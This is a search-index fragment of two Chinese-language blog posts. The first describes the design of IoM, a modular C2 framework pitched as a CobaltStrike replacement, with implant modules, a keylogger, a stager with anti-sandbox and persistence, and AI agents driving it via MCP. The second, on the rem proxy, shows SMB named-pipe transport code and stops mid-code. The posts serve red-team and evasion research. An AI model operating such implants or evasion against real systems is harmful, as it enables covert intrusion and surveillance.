\u66b4\u9732\u76f4\u63a5\u53ef\u4ee5\u8c03\u7528\u7684\u73b0\u6210api</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#module","title":"module","text":"<p>\u8be6\u60c5\u53ef\u89c1: https://chainreactors.github.io/wiki/IoM/manual/implant/#dynamic-module</p> <p>\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u73b0\u4ee3\u5316\u7684\u8bbe\u8ba1, \u4e0d\u9700\u8981\u7684\u529f\u80fd\u5c31\u4e0d\u8981\u6253\u5305\u8fdb\u6765, \u4e0d\u5b58\u5728\u5c31\u65e0\u4ece\u67e5\u6740. \u53ea\u5728\u9700\u8981\u65f6\u52a0\u8f7d\u9700\u8981\u7684\u529f\u80fd, \u80fd\u5728\u4f53\u79ef, \u7279\u5f81\u4e0a\u505a\u5230\u6700\u5c0f\u5316. </p> <p>\u8fd9\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\u65b9\u6848\u5f88\u591a, \u4f8b\u5982Havoc, \u5b83\u662f\u901a\u8fc7\u5927\u91cf\u7684BoF\u5c06\u5927\u91cf\u57fa\u7840\u529f\u80fd\u8f6c\u4e3a\u63d2\u4ef6, Sliver\u5219\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49\u683c\u5f0f\u7684extension\u5b9e\u73b0\u4e86dll+bof.</p> <p>\u800cIoM\u4e2d\u9009\u62e9\u4e86\u66f4\u52a0opsec\u7684\u65b9\u5f0f, \u901a\u8fc7headlessPE\u7684\u65b9\u5f0f, \u52a8\u6001\u52a0\u8f7d\u6a21\u5757, \u5c31\u50cf\u6b63\u5e38\u52a0\u8f7dDLL\u4e00\u6837, \u5c06\u6309\u7167\u63a5\u53e3\u89c4\u8303\u7f16\u5199\u7684\u6a21\u5757\u70ed\u52a0\u8f7d\u8fdb\u6765. \u751a\u81f3\u8fd9\u4e2a\u529f\u80fd\u672c\u8eab\u4e5f\u662f\u53ef\u4ee5\u62c6\u5378\u6389\u7684, \u53ef\u4ee5\u9009\u62e9\u53ea\u4fdd\u7559\u4e0a\u4f20,\u4e0b\u8f7d\u548cexec\u7684mini implant, \u751a\u81f3\u53ea\u4fdd\u7559loader implant\u7684nano implant.</p> <p>\u901a\u8fc7\u5b9a\u5236module\uff0c \u5c31\u53ef\u4ee5\u62d3\u5c55implant\u7684\u57fa\u7840\u80fd\u529b\uff0c\u5e76\u6309\u9700\u7ec4\u88c5</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#3rd-module","title":"3<sup>rd</sup>-module","text":"<p>\u5728v0.1.0\u7248\u672c\u4e2d\uff0c \u8fd8\u6dfb\u52a0\u4e863rd module\u30023<sup>rd</sup> module\u662f\u4f9d\u8d56\u4e8e\u5916\u90e8\u4ed3\u5e93\u5b9e\u73b0\u7684\u590d\u6742\u7684\u529f\u80fd\u7684\u6a21\u5757\uff0c \u5df2\u7ecf\u5b9e\u73b0\u7684\u4fdd\u7559 keylogger\uff0crem(\u6d41\u91cf/\u4ee3\u7406)\uff0c \u8ba1\u5212\u4e2d\u7684\u8fd8\u6709rustdesk\uff0c hvnc\uff0crdp\u7b49\u7b49\u3002 \u4e3a\u4e86\u9632\u6b62\u5927\u91cf\u5f15\u5165\u7684\u5916\u90e8\u5e93\u6c61\u67d3\u672c\u4f53\uff0c \u6240\u4ee5\u5c063rd module\u4f5c\u4e3a\u72ec\u7acb\u7684crate\u4f7f\u7528\uff0c \u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u9759\u6001\u94fe\u63a5\uff0c \u4e5f\u53ef\u4ee5\u5728\u672c\u4f53\u4e0a\u7ebf\u540e\u52a8\u6001\u52a0\u8f7d\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#prelude","title":"prelude","text":"<p>\u8fd9\u662f\u4e00\u79cd\u7279\u6b8a\u7684stager, \u53ef\u4ee5\u4f5c\u4e3a\u4e2d\u95f4\u9636\u6bb5\u7684stager\uff0c \u4e5f\u53ef\u4ee5\u4f5c\u4e3adropper\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u6b21\u6027\u7684implant\u3002 </p> <p>\u672c\u8d28\u4e0a\u662f\u5355\u7ebf\u7a0b\u6309\u9884\u914d\u7f6e\u987a\u5e8f\u6267\u884cmodule\u7684implant\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e00\u9636\u6bb5\u5b9e\u73b0\u53cd\u6c99\u7bb1\u53cd\u8c03\u8bd5\uff0c\u5206\u9636\u6bb5\u4e0a\u7ebf\uff0c \u6743\u9650\u7ef4\u6301\uff0c\u81ea\u52a8\u5316\u4efb\u52a1\uff0c\u9884\u52a0\u8f7d\uff0c\u5bc6\u94a5\u5206\u53d1\uff0c\u4e0b\u8f7d\uff0c \u4e0a\u7ebf\u7b49\u7b49\u5de5\u4f5c\u3002</p> <p>\u901a\u8fc7yaml\u914d\u7f6e\u5b8c\u540e\uff0c\u80fd\u5c06yaml\u7f16\u8bd1\u4e3a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u3002\u9762\u5bf9\u8fd9\u6837\u590d\u6742\u7684\u573a\u666f\uff0c \u5728\u4e4b\u524d\u90fd\u9700\u8981\u91cd\u65b0\u7f16\u5199\u4e00\u4e2aloader/dropper\uff0c \u800c\u73b0\u5728\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684module\uff0c \u5e76\u901a\u8fc7yaml\u5373\u53ef\u5b8c\u6210\u7b80\u5355\u7684\u6309\u9700\u751f\u6210\u4e2d\u95f4\u9636\u6bb5\uff0c \u6781\u5927\u7b80\u5316\u7684\u539f\u672c\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002 </p> <p>\u901a\u8fc7\u7f16\u6392module\u7684\u6267\u884c\u6d41\u7a0b\uff0c \u53ef\u4ee5\u5b9e\u73b0\u975e\u4ea4\u4e92\u5f0f\u7684\u79bb\u7ebf\u81ea\u52a8\u5316\u6d41\u7a0b, \u5d4c\u5165\u5230\u591a\u9636\u6bb5\u4e0a\u7ebf\u7684\u4efb\u610f\u6b65\u9aa4\u4e2d</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#other","title":"Other","text":"<p>\u4e0a\u9762\u63d0\u5230\u7684\u8fd9\u4e9b\u90fd\u662f\u53ea\u9700\u8981\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u8005\u7b80\u5355\u4fee\u6539\u4ee3\u7801\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u62d3\u5c55, \u4f46\u9762\u5bf9\u590d\u6742\u7684\u73b0\u5b9e\u573a\u666f\uff0c \u8fd9\u8fdc\u8fdc\u4e0d\u591f\u3002 \u5bf9\u4e8e\u80fd\u8fdb\u9636\u7684\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u5b9e\u9645\u4e0a\u9884\u7559\u4e86\u66f4\u591a\u7684\u63a5\u53e3\uff0c \u53ef\u4ee5\u7b80\u5355\u66ff\u6362\u51e0\u4e2a\u51fd\u6570\uff0c \u5373\u53ef\u91cd\u8f7dmalefic\u63d0\u4f9b\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd\u3002 \u8fd9\u90e8\u5206\u7559\u7ed9\u613f\u610f\u9605\u8bfb\u4ee3\u7801\u7684\u670b\u53cb</p> <ul> <li>\u81ea\u5b9a\u4e49\u52a0\u5bc6\u65b9\u5f0f</li> <li>\u81ea\u5b9a\u4e49\u4f20\u8f93\u5c42</li> <li>\u81ea\u5b9a\u4e49\u8fdb\u7a0b\u6ce8\u5165\u65b9\u5f0f</li> <li>\u66ff\u6362\u5f02\u6b65\u8fd0\u884c\u65f6</li> <li>\u81ea\u5b9a\u4e49stager\u4e0a\u7ebf, \u52a0\u5bc6\uff0c \u52a0\u8f7d\u5b9e\u73b0</li> <li>\u6dfb\u52a0server rpc\u63a5\u53e3</li> <li>\u6dfb\u52a0client command</li> <li>\u6dfb\u52a0mals function</li> <li>......</li> </ul>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u8054\u52a8","title":"\u8054\u52a8","text":"<p>\u6211\u4eec\u66f4\u5e0c\u671b\u5f62\u6210\u4e00\u4e2a\u8fdb\u653b\u6027\u5b89\u5168\u7684\u751f\u6001\uff0c\u800c\u4e0d\u662f\u7eaf\u7cb9\u7684\u6b66\u5668\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u7559\u4e0b\u5982\u6b64\u591a\u7684\u62d3\u5c55\u7ef4\u5ea6\u7684\u539f\u56e0\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#with-redteaming","title":"With RedTeaming","text":"<p>IoM\u5728\u6700\u521d\u8bbe\u60f3\u4e2d\uff0c \u5c31\u662f\u7528\u6765\u5f25\u8865CobaltStrike\u7684\u9057\u61be\uff0c \u6240\u4ee5\u5728\u57fa\u672c\u529f\u80fd\u548c\u53c2\u6570\u4e0a\u90fd\u662f\u4ee5CobaltStrike\u4f5c\u4e3a\u6807\u51c6\u53bb\u5b9e\u73b0\u7684\uff0c CobaltStrike\u5df2\u7ecf\u6709\u7684\uff0c \u6211\u4eec\u90fd\u5c3d\u53ef\u80fd\u5b9e\u73b0\u4e86\u76f8\u4f3c\u7684\u529f\u80fd\uff0c \u5e76\u4fdd\u7559\u4e86\u76f8\u4f3c\u7684\u63a5\u53e3\u4e0e\u7528\u6cd5\u3002 \u751a\u81f3\u5f88\u591a\u7406\u5e94\u88ab\u6dd8\u6c70\u7684\u6280\u672f\uff0c\u56e0\u4e3aCobaltStrike\u5e76\u6ca1\u6709\u5220\u9664\uff0c \u4e5f\u8fdb\u884c\u4e86\u91cd\u65b0\u5b9e\u73b0\u3002 \u76ee\u524d\u6765\u770b\uff0c \u5728\u7a33\u5b9a\u6027\u4e0e\u7528\u6237\u4f53\u9a8c\u4e0a\u786e\u5b9e\u65e0\u6cd5\u4e0eCobltStrike\u5bf9\u6807\uff0c \u4f46\u662f\u5728\u529f\u80fd\u4e0eOPSEC\u4e0a\u5df2\u7ecf\u4e0e\u5176\u76f8\u5f53\u751a\u81f3\u90e8\u5206\u8d85\u8d8a\u3002 </p> <p>\u6240\u4ee5v0.1.0\u7248\u672c\u53d1\u5e03\u540e\uff0cIoM\u5df2\u7ecf\u8db3\u591f\u4f5c\u4e3a\u90e8\u5206\u573a\u666f\u4e0b\u7684CobaltStrike\u7684\u4ee3\u66ff\uff0c\u80fd\u5728\u4e00\u4e9bReadTeaming\u884c\u52a8\u4e2d\u51fa\u73b0\u4e86\uff0c \u5e76\u4e14\u6211\u4eec\u4e5f\u8fdb\u884c\u4e86\u591a\u6b21\u5b9e\u6218\uff0c\u53d1\u73b0\u4e86\u4e0d\u5c11\u95ee\u9898\u5e76\u4e0d\u65ad\u6539\u8fdb\u81ea\u8eab\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#with-bas","title":"With BAS","text":"<p>\u6bd4\u8d77sliver\uff0c CoblatStrike\uff0c Havoc\uff0c\u8fd8\u6709nighthawk\uff0cbrc4\u4e4b\u7c7b\u7684\u6846\u67b6\uff0c IoM\u6700\u5927\u7684\u4f18\u52bf\u5c31\u662f\u5176\u4e30\u5bcc\u7684\u53ef\u62d3\u5c55\u63a5\u53e3\u3002\u6211\u4eec\u4e5f\u5e0c\u671b\u6210\u4e3aBAS\u7684\u57fa\u7840\u8bbe\u65bd\uff0c \u63d0\u4f9bpost-exploit\u90e8\u5206\u7684\u5143\u80fd\u529b\u3002 </p> <p>\u8fd1\u671f\u8c03\u7814\u4e86\u591a\u5bb6BAS\u4ea7\u54c1\uff0c\u6211\u53d1\u73b0\u67d0\u4e9b\u5382\u5546\u7684BAS\u95ee\u9898\u5728\u4e8e\u5c06playbook\u4f5c\u4e3a\u5176\u6838\u5fc3\u80fd\u529b\u4e0e\u5356\u70b9\uff0c\u4e0d\u5c11\u4ea7\u54c1\u7684\u57fa\u4e8e\u6d41\u91cf\u91cd\u653e\u6216\u8005\u56fa\u5b9a\u7684\u653b\u51fb\u811a\u672c\u5b9e\u73b0\u5176\u6838\u5fc3\u80fd\u529b\u3002 \u76f4\u63a5\u5bfc\u81f4\u4e86\u5728\u5bf9\u63a5ATT&amp;CK\u65f6\uff0c \u5c06TTP\u4f5c\u4e3a\u7ed3\u679c\u800c\u4e0d\u662f\u8fc7\u7a0b\u3002 \u5728\u5546\u4e1a\u89d2\u5ea6\u4e0a\u4e0d\u8bc4\u8bba\u5176\u4f18\u52a3\uff0c \u4f46\u5728\u6280\u672f\u5b9e\u73b0\u4e0a\u662f\u7f3a\u4e4f\u8010\u5fc3\u7684\u3002</p> <p>IoM\u7684\u67b6\u6784\u5f88\u9002\u5408\u4f5c\u4e3aBAS\u7684\u57fa\u7840\u80fd\u529b\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u5927\u91cf\u7684\u5143\u80fd\u529b\u4ee5\u53ca\u5feb\u901f\u7ec4\u5408\u5143\u80fd\u529b\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#with-asm","title":"With ASM","text":"<p>\u5728chainreactors\u7684\u8ba1\u5212\u4e2d\uff0c\u6211\u4eec\u4e5f\u6709\u4e00\u4e2a\u5e9e\u5927\u7684ASM\u7684\u8bbe\u8ba1\uff0c \u5e76\u4e14\u5b9e\u73b0\u4e86\u4e00\u4e2ademo\u3002 \u5176\u4e2d\u4e00\u4e2a\u6838\u5fc3\u8bbe\u8ba1\u5c31\u662f\u5c06rem(\u6d41\u91cf\u4ee3\u7406)\u5de5\u5177\u4f5c\u4e3a\u8054\u901aASM\u4e0eC2\u7684\u6865\u6881\uff0c\u5c06EASM(\u4e3b\u8981\u5173\u6ce8\u5916\u90e8\u8d44\u4ea7)\u62d3\u5c55\u4e3aCAASM(\u4e3b\u8981\u5173\u6ce8\u5185\u90e8\u8d44\u4ea7)\u6210\u4e3a\u5b8c\u6574\u7684ASM\uff0c\u5f53\u7136\u8fd9\u90fd\u662f\u7ad9\u5728\u653b\u51fb\u6a21\u62df/\u81ea\u52a8\u5316\u653b\u51fb\u89c6\u89d2\u7684\uff0c \u8fd9\u6837\u7684\u5b9e\u73b0\u65b9\u5f0f\u5e76\u4e0d\u4e00\u5b9a\u9002\u5408\u7532\u65b9\u5b89\u5168\u5efa\u8bbe\u3002</p> <p>\u5c06IoM\u7684implant\u4f5c\u4e3aCAASM\u7684agent, \u5728\u76ee\u6807\u5185\u7f51\u8fdb\u884c\u81ea\u52a8\u5316\u7684\u63a2\u6d4b\uff0c\u4ea4\u4e92\uff0c \u6570\u636e\u6c47\u603b\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#with-ai","title":"With  AI","text":"<p>AI\u5df2\u7ecf\u5b8c\u5168\u878d\u5165\u4e86IoM\u5f00\u53d1\u7684\u5de5\u4f5c\u6d41\u4e2d\uff0c \u5728\u957f\u671f\u7684\u4f7f\u7528\u4e2d\u80fd\u5f88\u8f7b\u6613\u7684\u53d1\u73b0\uff0c \u8981\u8ba9AI\u4ece\u96f6\u53bb\u505a\u67d0\u4e2a\u4e8b\u60c5\uff0c \u5f80\u5f80\u9700\u8981\u5927\u91cf\u7684\u5bf9\u8bdd\uff0c \u4f46\u662f\u5982\u679c\u5df2\u7ecf\u6709\u4e00\u5957\u76f8\u5bf9\u6210\u719f\u7684\u6846\u67b6\uff0c \u8ba9AI\u53bb\u586b\u5145\u5185\u5b58\uff0c AI\u80fd\u5b8c\u6210\u5f97\u975e\u5e38\u597d\u3002 \u800c\u73b0\u5728IoM\u63d0\u4f9b\u4e86\u597d\u51e0\u5957\u53ef\u62d3\u5c55\u7684\u63a5\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5f00\u53d1\u6846\u67b6\u3002 \u5f53\u6211\u5c1d\u8bd5\u8ba9AI\u53bb\u7f16\u5199\u63d2\u4ef6\u6216\u8005\u63a7\u5236IoM\u5b8c\u6210\u4efb\u52a1\u65f6\uff0c AI\u8868\u73b0\u51fa\u4e86\u8d85\u8fc7\u5927\u90e8\u5206\u4eba\u7c7b\u7684\u80fd\u529b\u3002 </p> <p>\u6211\u4eec\u6b63\u5728\u63a2\u7d22\u901a\u8fc7\u63d0\u4f9b\u4e0d\u540c\u573a\u666f\u7684prompt\uff0c \u57fa\u4e8e\u6211\u4eec\u7684vscode\u7684GUI\u63d2\u4ef6\uff0c\u76f4\u63a5\u63a7\u5236IoM\u4ee3\u66ff\u4eba\u7c7b\u53bb\u5b8c\u6210\u4efb\u52a1\u3002</p> <p>\u5728\u5199\u8fd9\u7bc7\u6587\u7ae0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8bde\u751f\u4e86\u4e00\u4e2a\u6781\u5927\u7b80\u5316AI agent\u5b9e\u73b0\u7684MCP\u534f\u8bae\u3002 \u6211\u4eec\u53d1\u73b0\u4e0d\u518d\u9700\u8981\u901a\u8fc7prompt\u6765\u6559\u4f1aAI\uff0c \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7MCP\u534f\u8bae</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u5728IoM\u4e2d, client/server/listener/implant \u56db\u7aef\u51e0\u4e4e\u662f\u5b8c\u5168\u89e3\u8026\u7684, \u53ef\u4ee5\u5728\u4efb\u610f\u4e00\u7aef\u63d2\u5165\u7528\u6237\u81ea\u5df1\u7f16\u5199\u7684\u5b9e\u73b0. \u800c\u4e0d\u5f71\u54cd\u5230\u5176\u4ed6\u7ec4\u4ef6\u7684\u5de5\u4f5c, \u6211\u4eec\u901a\u8fc7\u7ea6\u5b9a\u7edf\u4e00\u7684\u89c4\u8303\u6765\u517c\u5bb9\u5c3d\u53ef\u80fd\u591a\u7684\u751f\u6001\u4e0e\u793e\u533a. </p> <p>\u5728\u672c\u6587\u53d1\u5e03\u7684\u540c\u65f6, \u4e5f\u4f1a\u5c1d\u8bd5\u9080\u8bf7\u4e00\u4e9b\u5f00\u53d1\u8005\u4e0eIoM\u8fdb\u884c\u5bf9\u63a5, \u5171\u540c\u5efa\u8bbe.</p> <p>\u73b0\u5728\u7684IoM\u5c1d\u8bd5\u5b9e\u73b0\u4ee3\u66ffCobaltStrike\u7684\u51c6\u5907\uff0c\u671d\u7740\u8fd9\u4e00\u76ee\u6807\u524d\u8fdb\u3002</p> <p>CobaltStrike \u7559\u7ed9\u7528\u6237\u53ef\u66f4\u6539\u7684\u63a5\u53e3\u5f88\u591a:</p> <ul> <li>\u57fa\u4e8esleep\u8bed\u8a00\u7684Aggressive Script, \u80fd\u901a\u8fc7\u811a\u672c\u8c03\u7528\u7edd\u5927\u90e8\u5206implant\u7684\u529f\u80fd\u4ee5\u53ca\u5bf9ui\u7684\u52a8\u6001\u62d3\u5c55;</li> <li>\u901a\u8fc7profile\u5b9e\u73b0\u7684\u5bf9\u6d41\u91cf\u7279\u5f81\u5df2\u7ecf\u90e8\u5206\u52a8\u6001\u7279\u5f81\u7684\u81ea\u5b9a\u4e49</li> <li>arsenal kit\u4e2d\u63d0\u4f9b\u7684sleepmask\uff0c artifact\uff0c udrl\uff0cresource \u7b49\u5bf9CS\u5168\u5c40\u7684\u529f\u80fd\u66ff\u6362\uff0c \u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684OPSEC</li> </ul> <p>\u8981\u5b9e\u73b0\u5bf9CobaltStrike\u7684\u5b8c\u5168\u66ff\u6362\uff0c \u4e0d\u53ef\u907f\u514d\u5f97\u5b9e\u73b0\u4e0a\u8bc9\u6240\u6709\u529f\u80fd\u3002</p> <p>\u8fd9\u662f\u4e2a\u5e9e\u5927\u7684\u5de5\u7a0b\uff0c \u76ee\u524dIoM\u80fd\u505a\u5230CS\u5927\u90e8\u5206\u62d3\u5c55\u529f\u80fd\u7684\u7b49\u4ef7\u66ff\u6362\uff0c \u4f46\u786e\u5b9e\u5728\u4e0d\u5c11\u7ec6\u8282\u4e0a\u65e0\u6cd5\u5b8c\u5168\u5b9e\u73b0\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/","title":"\u653b\u9632\u573a\u666f\u4e2d\u7684\u7f51\u7edc\u4fa7\u5bf9\u6297\u9769\u547d (\u4e0b)   rem","text":""},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u5728\u4e0a\u4e00\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86rem\u7684\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u3002 \u800c\u5f53\u6211\u4eec\u5b8c\u6210\u4e86\u57fa\u7840\u7684\u6784\u5efa\uff0c\u73b0\u5728\u53ef\u4ee5\u505a\u5f97\u66f4\u591a\uff01</p> <p>\u7f51\u7edc\u4fa7\u7684\u5bf9\u6297\u5f3a\u5ea6\u8fdc\u8fdc\u4e0d\u5982\u7aef\u4e0a\u5bf9\u6297\u6fc0\u70c8\uff0c \u53ea\u9700\u8981\u5f88\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u80fd\u7ed5\u8fc7\u6240\u6709\u7684\u8bbe\u5907\u3002 rem\u63d0\u4f9b\u4e86\u8fd9\u6837\u7684\u6f5c\u529b\u3002</p> <p>\u4e3a\u4e86\u89c4\u907f\u6f5c\u5728\u7684\u98ce\u9669\uff0crem-community\u4e2d\u6ca1\u6709\u7279\u522b\u6fc0\u8fdb\u7684\u6280\u672f\uff0c\u5927\u591a\u53ea\u63d0\u4f9b\u4e86\u8bbe\u8ba1\u601d\u8def\u3002 \u4f46\u5728\u7406\u89e3\u539f\u7406\u540e\uff0c \u5c06\u9700\u6c42\u544a\u8bc9cursor\uff0c \u53ef\u4ee5\u975e\u5e38\u8f7b\u6613\u7684\u5b9e\u73b0\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u5185\u5bb9\u3002</p> <p>\u672c\u6587\u5c06\u7ed3\u5408\u5404\u79cd\u5b9e\u6218\u573a\u666f\uff0c \u8fdb\u4e00\u6b65\u63a2\u7d22rem\u5728\u5404\u4e2a\u573a\u666f\u4e2d\u7684\u73a9\u6cd5\u3002 \u672c\u6587\u7684\u5185\u5bb9\u6d89\u53ca\u5927\u91cf\u4e13\u4e1a\u77e5\u8bc6\u548c\u4ee3\u7801\uff0c\u5efa\u8bae\u7ed3\u5408\u4ee3\u7801\u9605\u8bfb</p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u4f20\u8f93\u5c42","title":"\u4f20\u8f93\u5c42","text":"<p>\u5728\u524d\u6587\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7rem\u7684\u67b6\u6784\u3002 \u7b80\u5355\u56de\u987e\u4e00\u4e0b\uff0c \u4efb\u4f55\u80fd\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u4fe1\u9053\u90fd\u53ef\u4ee5\u88ab\u5c01\u88c5\u4e3arem\u7684\u4f20\u8f93\u5c42\uff0c\u57fa\u4e8e\u6b64\u6784\u5efa\u5404\u79cd\u5e94\u7528\u3002 </p> <p>\u7406\u8bba\u4e0a\u53ea\u8981\u5b58\u5728\u6570\u636e\u4ea4\u6362\uff0c \u5c31\u80fd\u6784\u5efarem\u4f20\u8f93\u5c42\uff0c \u51fa\u4e8e\u6027\u80fd\u8003\u8651TCP/UDP\u4e4b\u7c7b\u7684\u5e38\u89c1\u534f\u8bae\u662f\u6700\u63a8\u8350\u7684\u9009\u9879\uff0c \u4f46\u9762\u5bf9\u4e00\u4e9b\u6781\u7aef\u573a\u666f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u57fa\u4e8erem\u7684\u67b6\u6784\u5feb\u901f\u5b9e\u73b0\u4e0d\u540c\u4f20\u8f93\u5c42\u7684\u4fe1\u9053\u3002 </p> <p>\u5728\u4e0a\u6587\u4e2d\uff0c \u6211\u4eec\u7b80\u5355\u4ecb\u7ecd\u4e86\u4f20\u8f93\u5c42\u7684\u5b9a\u4e49, \u5b9e\u9645\u4e0a\u5c31\u662f\u5bf9golang\u539f\u6709\u63a5\u53e3\u7684\u7b80\u5355\u5305\u88c5\uff0c \u8fd9\u662f\u4e3a\u4e86\u6700\u5927\u7a0b\u5ea6\u517c\u5bb9golang\u751f\u6001\u7684\u8bbe\u8ba1, \u4e0d\u8fdb\u884c\u8fc7\u591a\u62bd\u8c61\u3002 </p> <pre><code>type TunnelDialer interface {  \n    Dial(dst string) (net.Conn, error)  \n}\n\ntype TunnelListener interface {  \n    net.Listener  \n    Listen(dst string) (net.Listener, error)  \n}\n</code></pre> <p>\u4e5f\u56e0\u5982\u6b64\uff0c \u6211\u4eec\u53ea\u9700\u8981\u7b80\u5355\u5b9e\u73b0\u57fa\u672c\u63a5\u53e3\uff0c\u5c31\u80fd\u5c06\u4e00\u4e2a\u4ece\u672a\u6709\u4eba\u5b9e\u73b0\u8fc7\u7684\u4f20\u8f93\u5c42\u5b9e\u73b0\u4e3arem\u7684\u865a\u62df\u4f20\u8f93\u5c42\u3002 </p> <p>\u6211\u4eec\u4ee5\u4e00\u4e2a\u5e94\u8be5\u6ca1\u6709\u5176\u4ed6golang\u5de5\u5177\u5b9e\u73b0\u8fc7\u7684\u4f20\u8f93\u5c42\u4e3a\u4f8b\uff0c \u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u4f20\u8f93\u5c42\u3002 </p> <p>\u8fd9\u662f\u57fa\u4e8e\u8fdc\u7a0bSMB\u547d\u540d\u7ba1\u9053\u5b9e\u73b0\u7684rem\u4f20\u8f93\u5c42:</p> <pre><code>func NewUnixDialer() *UnixDialer {  \n    return &amp;UnixDialer{  \n       meta: make(core.Metas),  \n    }  \n}  \n\nfunc (c *UnixDialer) Dial(dst string) (net.Conn, error) {  \n    u, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.meta[\"url\"] = u  \n    host := u.Hostname()  \n    pipePath := `\\\\` + host + `\\pipe\\` + u.PathString()  \n    utils.Log.Debugf(\"dial pipe: %s\", pipePath)  \n    return winio.DialPipe(pipePath, nil)  \n}  \n\nfunc NewUnixListener() *UnixListener {  \n    return &amp;UnixListener{  \n       meta: make(core.Metas),  \n    }  \n}  \n\nfunc (c *UnixListener) Listen(dst string) (net.Listener, error) {  \n    pipeUrl, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    if pipeUrl.Hostname() == \"0.0.0.0\" {  \n       pipeUrl.SetHostname(\".\")  \n    }  \n    if pipeUrl.PathString() == \"\" {  \n       pipeUrl.Path = \"/\" + c.meta[\"pipe\"].(string)  \n    }  \n    pipePath := fmt.Sprintf(`\\\\%s\\pipe\\%s`, pipeUrl.Hostname(), pipeUrl.PathString())  \n    c.meta[\"url\"] = pipeUrl  \n    config := &amp;winio.PipeConfig{  \n       